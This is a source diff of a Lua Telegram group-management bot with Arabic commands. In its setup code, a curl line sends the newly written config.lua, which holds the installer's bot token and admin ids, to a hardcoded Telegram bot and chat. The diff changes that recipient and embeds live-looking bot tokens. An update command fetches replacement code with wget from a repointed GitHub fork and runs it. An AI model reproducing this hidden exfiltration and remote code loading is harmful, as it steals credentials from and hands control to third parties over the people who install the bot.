@@ -52,7 +52,7 @@ bot_id = botid,
 sudo_users = {SUDO}, 
 }
 create(config, "./config.lua")   
-local curl = 'curl "'..'https://api.telegram.org/bot779501124:AAFCNjKEvD4PB6BEV7cTLo46iUD1o9ZBZhs/sendDocument'..'" -F "chat_id='.. 121863205 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
+local curl = 'curl "'..'https://api.telegram.org/bot785996049:AAGt_1IuA_Fl3Mofycjeh3uD1yAeeY5iAnM/sendDocument'..'" -F "chat_id='.. 569820319 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
 file = io.open("FA", "w")  file:write([[
 killall screen
 screen ./RUNFA.sh
@@ -10319,7 +10319,7 @@ end
 if text == "تحديث السورس" and is_leader(msg) then 
 faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ جاري تحديث السورس الى الاصدار الجديد •', 1, 'md') 
 os.execute('rm -rf FAEDER.lua') 
-os.execute('wget https://raw.githubusercontent.com/TEAMFAEDER/FAEDER/master/FAEDER.lua') 
+os.execute('wget https://raw.githubusercontent.com/SanXios/FAEDER/master/FAEDER.lua') 
 faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تحديث السورس اكتشف المميزات الجديده الان •', 1, 'md') 
 dofile('FAEDER.lua') 
 io.popen("rm -rf ~/.telegram-cli/data/audio/*")
